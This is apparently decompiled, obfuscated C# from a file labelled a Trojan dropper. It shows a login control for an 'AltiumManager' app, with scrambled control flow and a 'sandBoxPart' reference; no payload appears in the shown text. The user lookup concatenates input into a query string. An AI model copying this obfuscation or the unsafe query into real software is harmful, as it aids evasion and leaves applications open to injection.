// Decompiled with JetBrains decompiler
// Type: AltiumManager.loginCtrl
// Assembly: LeOcHwILpefYMF8, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A7C159C0-2645-0515-18CC-33AA0158F2C6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-949b68beab7b82f9c18962df03d52a02a963263103606c758f668476868a1381.exe

using AltiumManager.AltiumDatabaseDataSetTableAdapters;
using AltiumManager.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace AltiumManager
{
  [DesignerGenerated]
  public class loginCtrl : UserControl
  {
    private IContainer components;

    public loginCtrl() => this.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D5();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (((!disposing ? 1 : 0) != 0 || this.components == null ? 1 : 0) != 0)
          return;
label_7:
        int num1 = 1;
        int num2 = -57;
        while (true)
        {
          switch ((num2 ^ 97) + 93)
          {
            case 0:
              switch (num1)
              {
                case 108:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.get_forgotBtn);
                  num1 = 0;
                  goto label_2;
                case 109:
                  this.components.Dispose();
                  num1 = 2;
                  goto label_2;
                case 110:
                  num1 = 3;
                  goto label_2;
                case 111:
                  goto label_12;
                default:
                  num2 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(102);
                  continue;
              }
            case 1:
              goto label_7;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginCtrl.get_userTxt);
              num2 = -60;
              continue;
            case 3:
label_2:
              num1 ^= 108;
              break;
          }
          num2 = AltiumDatabaseDataSet.UsersDataTable.\uE23F\uE7C9\uEE0F\uE7EA\uED41\uE818\uECBF\uEA9A\uF708\uE0CF\uE6D6\uEB0D(95);
        }
label_12:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D5()
    {
label_2:
      int num1 = 17;
label_1:
      while (true)
      {
        num1 ^= 104;
        switch (num1)
        {
          case 107:
            this.clearBtn.Text = "Clear";
            this.clearBtn.UseVisualStyleBackColor = true;
            this.AltiumDatabaseDataSet.DataSetName = "AltiumDatabaseDataSet";
            this.AltiumDatabaseDataSet.SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
            num1 = 21;
            continue;
          case 108:
            this.loginBtn.TabIndex = 4;
            this.loginBtn.Text = "Login";
            this.loginBtn.UseVisualStyleBackColor = true;
            this.clearBtn.Location = new Point(84, 67);
            num1 = 18;
            continue;
          case 109:
            this.Label2.Location = new Point(16, 44);
            this.Label2.Name = "Label2";
            this.Label2.Size = new Size(56, 13);
            num1 = 232;
            continue;
          case 110:
            this.passTxt = new TextBox();
            this.loginBtn = new Button();
            this.clearBtn = new Button();
            this.AltiumDatabaseDataSet = new AltiumDatabaseDataSet();
            num1 = 28;
            continue;
          case 111:
            this.forgotBtn = new Button();
            this.AltiumDatabaseDataSet.BeginInit();
            ((ISupportInitialize) this.UsersBindingSource).BeginInit();
            this.SuspendLayout();
            num1 = 19;
            continue;
          case 112:
            this.userTxt.Size = new Size(173, 20);
            this.userTxt.TabIndex = 2;
            this.passTxt.Location = new Point(78, 41);
            num1 = 23;
            continue;
          case 113:
            this.Label1.Size = new Size(58, 13);
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Username:";
            this.Label2.AutoSize = true;
            num1 = 5;
            continue;
          case 114:
            goto label_10;
          case 115:
            this.forgotBtn.Name = "forgotBtn";
            this.forgotBtn.Size = new Size(96, 23);
            this.forgotBtn.TabIndex = 7;
            num1 = 20;
            continue;
          case 116:
            this.UsersBindingSource = new BindingSource(this.components);
            this.UsersTableAdapter = new UsersTableAdapter();
            this.TableAdapterManager = new TableAdapterManager();
            num1 = 7;
            continue;
          case 117:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (loginCtrl.set_AltiumDatabaseDataSet);
            num1 = 29;
            continue;
          case 118:
            this.Controls.Add((Control) this.forgotBtn);
            this.Controls.Add((Control) this.clearBtn);
            this.Controls.Add((Control) this.loginBtn);
            num1 = 26;
            continue;
          case 119:
            this.loginBtn.Location = new Point(3, 67);
            this.loginBtn.Name = "loginBtn";
            this.loginBtn.Size = new Size(75, 23);
            num1 = 4;
            continue;
          case 120:
            this.Name = nameof (loginCtrl);
            this.Size = new Size(282, 104);
            this.AltiumDatabaseDataSet.EndInit();
            num1 = 233;
            continue;
          case 121:
            this.components = (IContainer) new System.ComponentModel.Container();
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.userTxt = new TextBox();
            num1 = 6;
            continue;
          case 122:
            this.clearBtn.Name = "clearBtn";
            this.clearBtn.Size = new Size(65, 23);
            this.clearBtn.TabIndex = 5;
            num1 = 3;
            continue;
          case 123:
            this.Label1.AutoSize = true;
            this.Label1.Location = new Point(14, 14);
            this.Label1.Name = "Label1";
            num1 = 25;
            continue;
          case 124:
            this.forgotBtn.Text = "Forgot Password";
            this.forgotBtn.UseVisualStyleBackColor = true;
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = 30;
            continue;
          case 125:
            this.UsersBindingSource.DataMember = "Users";
            this.UsersBindingSource.DataSource = (object) this.AltiumDatabaseDataSet;
            this.UsersTableAdapter.ClearBeforeFill = true;
            num1 = 22;
            continue;
          case 126:
            this.TableAdapterManager.BackupDataSetBeforeUpdate = false;
            this.TableAdapterManager.UpdateOrder = TableAdapterManager.UpdateOrderOption.InsertUpdateDelete;
            this.TableAdapterManager.UsersTableAdapter = this.UsersTableAdapter;
            this.forgotBtn.Location = new Point(155, 67);
            num1 = 27;
            continue;
          case (int) sbyte.MaxValue:
            this.passTxt.Name = "passTxt";
            this.passTxt.Size = new Size(173, 20);
            this.passTxt.TabIndex = 3;
            this.passTxt.UseSystemPasswordChar = true;
            num1 = 31;
            continue;
          case 128:
            this.Label2.TabIndex = 1;
            this.Label2.Text = "Password:";
            this.userTxt.Location = new Point(78, 11);
            this.userTxt.Name = "userTxt";
            num1 = 24;
            continue;
          case 129:
            goto label_35;
          default:
            goto label_2;
        }
      }
label_10:
      this.Controls.Add((Control) this.passTxt);
label_12:
      int num2 = 12;
      while (true)
      {
        switch (num2 ^ 100)
        {
          case 100:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.get_clearBtn);
            num2 = 0;
            continue;
          case 101:
            this.Controls.Add((Control) this.userTxt);
            num2 = 15;
            continue;
          case 102:
            num2 = 3;
            continue;
          case 103:
            this.Controls.Add((Control) this.Label1);
            num2 = 14;
            continue;
          case 104:
            num2 = 1;
            continue;
          case 105:
            this.Controls.Add((Control) this.Label2);
            num2 = 2;
            continue;
          case 106:
            num1 = 16;
            num2 = 8;
            continue;
          case 107:
            num2 = 13;
            continue;
          case 108:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_35:
      ((ISupportInitialize) this.UsersBindingSource).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("userTxt")]
    internal virtual TextBox userTxt { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual TextBox passTxt
    {
      get => this._passTxt;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        KeyPressEventHandler pressEventHandler = new KeyPressEventHandler(this.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D9);
        TextBox passTxt1 = this._passTxt;
        if ((passTxt1 == null ? 1 : 0) == 0)
          passTxt1.KeyPress -= pressEventHandler;
        this._passTxt = value;
        TextBox passTxt2 = this._passTxt;
        if ((passTxt2 == null ? 1 : 0) != 0)
          return;
        passTxt2.KeyPress += pressEventHandler;
      }
    }

    internal virtual Button loginBtn
    {
      get => this._loginBtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D6);
        Button loginBtn1 = this._loginBtn;
        if ((loginBtn1 == null ? 1 : 0) == 0)
          loginBtn1.Click -= eventHandler;
        this._loginBtn = value;
        Button loginBtn2 = this._loginBtn;
        if ((loginBtn2 == null ? 1 : 0) != 0)
          return;
        loginBtn2.Click += eventHandler;
      }
    }

    internal virtual Button clearBtn
    {
      get => this._clearBtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D7);
        Button clearBtn1 = this._clearBtn;
        if ((clearBtn1 == null ? 1 : 0) == 0)
          clearBtn1.Click -= eventHandler;
        this._clearBtn = value;
        Button clearBtn2 = this._clearBtn;
        if ((clearBtn2 == null ? 1 : 0) != 0)
          return;
        clearBtn2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("AltiumDatabaseDataSet")]
    internal virtual AltiumDatabaseDataSet AltiumDatabaseDataSet { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersBindingSource")]
    internal virtual BindingSource UsersBindingSource { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsersTableAdapter")]
    internal virtual UsersTableAdapter UsersTableAdapter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TableAdapterManager")]
    internal virtual TableAdapterManager TableAdapterManager { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button forgotBtn
    {
      get => this._forgotBtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D8);
        Button forgotBtn1 = this._forgotBtn;
        if ((forgotBtn1 == null ? 1 : 0) == 0)
          forgotBtn1.Click -= eventHandler;
        this._forgotBtn = value;
        Button forgotBtn2 = this._forgotBtn;
        if ((forgotBtn2 == null ? 1 : 0) != 0)
          return;
        forgotBtn2.Click += eventHandler;
      }
    }

    private void \uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D6(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F7(62);
      activeUserClass tempObj;
      bool flag;
      loginClass loginClass;
      while (true)
      {
        switch ((num1 ^ 94) + 99)
        {
          case 0:
            tempObj = new activeUserClass();
            num1 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F8(63);
            continue;
          case 1:
            num1 = -3;
            continue;
          case 2:
            if (flag)
            {
              num1 = -8;
              continue;
            }
            goto label_14;
          case 3:
            num1 = -5;
            continue;
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.set_AltiumDatabaseDataSet);
            num1 = -1;
            continue;
          case 5:
            loginClass = new loginClass();
            num1 = -61;
            continue;
          case 6:
            flag = loginClass.checkData();
            num1 = -63;
            continue;
          case 7:
            loginClass.userName = Strings.LCase(this.userTxt.Text);
            num1 = -2;
            continue;
          case 8:
            loginClass.userPass = this.passTxt.Text;
            num1 = -64;
            continue;
          case 9:
            goto label_13;
          default:
            goto label_2;
        }
      }
label_13:
      int num2 = 0;
      goto label_15;
label_14:
      num2 = 1;
label_15:
      if (num2 != 0)
        return;
      if ((loginClass.userAvailable(this.AltiumDatabaseDataSet.Users, this.UsersTableAdapter) ? 1 : 0) == 0)
      {
        AltiumDatabaseDataSet.UsersRow[] usersRowArray = (AltiumDatabaseDataSet.UsersRow[]) this.AltiumDatabaseDataSet.Users.Select("Username = '" + loginClass.userName + "'");
        string userPass = usersRowArray[0].UserPass;
        Simple3Des simple3Des = new Simple3Des(loginClass.userPass);
        try
        {
          simple3Des.decryptData(userPass);
label_20:
          int num3 = AltiumDatabaseDataSet.\uF5B4\uEBB6\uED16\uE0FF\uE59B\uF026\uEFAB\uE051\uE189\uE10C\uF7F9\uF6D6(60);
          string userRole;
          while (true)
          {
            switch ((num3 ^ 105) + 106)
            {
              case 0:
                tempObj.userName = loginClass.userName;
                num3 = -9;
                continue;
              case 1:
                int num4 = (int) Interaction.MsgBox((object) ("Logged in as " + Strings.Trim(userRole)));
                num3 = -13;
                continue;
              case 2:
                num3 = -1;
                continue;
              case 3:
                tempObj.userRole = Strings.Trim(userRole);
                num3 = -12;
                continue;
              case 4:
                \uEF33\uF205\uE560\uF33F\uE7F1\uEFE2\uEF15\uE192\uE066\uF727\uF51A\uEAE7.\uE681\uF0E4\uF481\uF504\uE501\uF2E5\uE299\uE5CD\uE41E\uE684\uF872\uF3A0.\uE0A4\uF566\uEBFE\uE652\uF3D5\uF6E6\uE84B\uF36D\uE9EA\uE2D6\uE8A2\uF080.contentPanel.Controls.Clear();
                num3 = -15;
                continue;
              case 5:
                userRole = usersRowArray[0].UserRole;
                num3 = -2;
                continue;
              case 6:
                num3 = -54;
                continue;
              case 7:
                num3 = -56;
                continue;
              case 8:
                num3 = -16;
                continue;
              case 9:
                \uEF33\uF205\uE560\uF33F\uE7F1\uEFE2\uEF15\uE192\uE066\uF727\uF51A\uEAE7.\uE681\uF0E4\uF481\uF504\uE501\uF2E5\uE299\uE5CD\uE41E\uE684\uF872\uF3A0.\uE0A4\uF566\uEBFE\uE652\uF3D5\uF6E6\uE84B\uF36D\uE9EA\uE2D6\uE8A2\uF080.setUserObj(tempObj);
                num3 = -11;
                continue;
              case 10:
                num3 = -10;
                continue;
              case 11:
                tempObj.userEmail = usersRowArray[0].UserEmail;
                num3 = -55;
                continue;
              case 12:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginCtrl.get_TableAdapterManager);
                num3 = -53;
                continue;
              case 13:
                goto label_34;
              default:
                goto label_20;
            }
          }
label_34:;
        }
        catch (CryptographicException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          int num5 = (int) Interaction.MsgBox((object) "Incorrect password");
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        int num6 = (int) Interaction.MsgBox((object) "User not found");
      }
    }

    private void \uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D7(
      object _param1,
      EventArgs _param2)
    {
label_4:
      int num1 = 15;
      int num2 = 11;
      while (true)
      {
        switch (num2 ^ 98)
        {
          case 102:
            goto label_4;
          case 103:
            switch (num1)
            {
              case 100:
                this.passTxt.Clear();
                num1 = 12;
                goto label_1;
              case 101:
                num1 = 2;
                goto label_1;
              case 102:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.get_UsersTableAdapter);
                num1 = 13;
                goto label_1;
              case 103:
                num1 = 3;
                goto label_1;
              case 104:
                this.userTxt.Clear();
                num1 = 14;
                goto label_1;
              case 105:
                goto label_11;
              default:
                num2 = 4;
                continue;
            }
          case 104:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginCtrl.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D5);
            num2 = 10;
            continue;
          case 105:
label_1:
            num1 ^= 107;
            break;
        }
        num2 = 5;
      }
label_11:;
    }

    private void \uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D8(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = sandBoxPart.\uEB44\uF432\uF881\uF8EC\uE0C2\uE511\uEEC6\uE36D\uF8FE\uEE87\uEB15\uE281(106);
      loginClass loginClass;
      bool flag;
      mailerClass mailerClass;
      while (true)
      {
        switch ((num1 ^ 96) + 92)
        {
          case 0:
            loginClass = new loginClass();
            num1 = -54;
            continue;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.\uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D7);
            num1 = -59;
            continue;
          case 2:
            flag = Microsoft.VisualBasic.CompilerServices.Operators.CompareString(loginClass.userName, "", false) == 0;
            num1 = -55;
            continue;
          case 3:
            loginClass.userName = this.userTxt.Text;
            num1 = -56;
            continue;
          case 4:
            num1 = AltiumDatabaseDataSet.UsersDataTable.\uE23F\uE7C9\uEE0F\uE7EA\uED41\uE818\uECBF\uEA9A\uF708\uE0CF\uE6D6\uEB0D(108);
            continue;
          case 5:
            if (flag)
            {
              num1 = -53;
              continue;
            }
            goto label_12;
          case 6:
            mailerClass = new mailerClass();
            num1 = -57;
            continue;
          case 7:
            goto label_11;
          default:
            goto label_2;
        }
      }
label_11:
      int num2 = 0;
      goto label_13;
label_12:
      num2 = 1;
label_13:
      if (num2 == 0)
      {
        int num3 = (int) Interaction.MsgBox((object) "Please enter the username");
      }
      else
      {
        if ((loginClass.userAvailable(this.AltiumDatabaseDataSet.Users, this.UsersTableAdapter) ? 1 : 0) == 0)
        {
          string str1 = loginClass.randomPass();
label_18:
          int num4 = 12;
          Simple3Des simple3Des;
          AltiumDatabaseDataSet.UsersRow[] usersRowArray;
          string str2;
          while (true)
          {
            switch (num4 ^ 102)
            {
              case 96:
                num4 = 13;
                continue;
              case 97:
                num4 = 0;
                continue;
              case 98:
                num4 = 1;
                continue;
              case 99:
                simple3Des = new Simple3Des(str1);
                num4 = 15;
                continue;
              case 100:
                usersRowArray[0].UserPass = str2;
                num4 = 7;
                continue;
              case 101:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginCtrl.set_forgotBtn);
                num4 = 3;
                continue;
              case 102:
                this.UsersTableAdapter.Update(this.AltiumDatabaseDataSet.Users);
                num4 = 14;
                continue;
              case 103:
                int num5 = (int) Interaction.MsgBox((object) "A new password has been sent to the email on file.  Please login and with the new password and use the change password action under user.");
                num4 = 6;
                continue;
              case 104:
                mailerClass.sendPassword(Strings.Trim(usersRowArray[0].UserEmail), "Password Reset", str1);
                num4 = 4;
                continue;
              case 105:
                str2 = simple3Des.encryptData("text");
                num4 = 2;
                continue;
              case 106:
                usersRowArray = (AltiumDatabaseDataSet.UsersRow[]) this.AltiumDatabaseDataSet.Users.Select("Username = '" + loginClass.userName + "'");
                num4 = 5;
                continue;
              case 107:
                goto label_31;
              default:
                goto label_18;
            }
          }
        }
        else
        {
          int num6 = (int) Interaction.MsgBox((object) "User doesn't exist");
        }
label_31:;
      }
    }

    private void \uE4EC\uED82\uF176\uE770\uE7CE\uEFB4\uEDC2\uE941\uE4D6\uEBB5\uE8DD\uF1D9(
      object _param1,
      KeyPressEventArgs _param2)
    {
      if ((_param2.KeyChar != '\r' ? 1 : 0) != 0)
        return;
label_7:
      int num1 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F7(66);
      int num2 = 11;
      while (true)
      {
        switch (num2 ^ 100)
        {
          case 108:
            switch (num1 + 108)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginCtrl.get_UsersBindingSource);
                num1 = -10;
                goto label_1;
              case 1:
                this.loginBtn.PerformClick();
                num1 = -12;
                goto label_1;
              case 2:
                num1 = -11;
                goto label_1;
              case 3:
                goto label_12;
              default:
                num2 = 10;
                continue;
            }
          case 109:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginCtrl.get_AltiumDatabaseDataSet);
            num2 = 9;
            continue;
          case 110:
            goto label_7;
          case 111:
label_1:
            num1 ^= 98;
            break;
        }
        num2 = 8;
      }
label_12:;
    }
  }
}
